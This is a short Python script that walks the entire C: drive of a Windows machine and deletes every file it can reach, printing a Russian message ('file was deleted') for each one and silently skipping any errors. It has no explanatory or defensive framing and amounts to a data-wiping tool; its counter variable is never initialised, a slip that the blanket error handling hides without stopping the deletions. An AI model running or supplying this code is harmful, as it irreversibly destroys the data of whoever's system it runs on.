import os
for root, dirs, files in os.walk('C://'):
  for file in files:
      try:
          os.remove(os.path.join(root, file))
          print(f'{file} был удален')
          i += 1
      except Exception as e:  
          continue
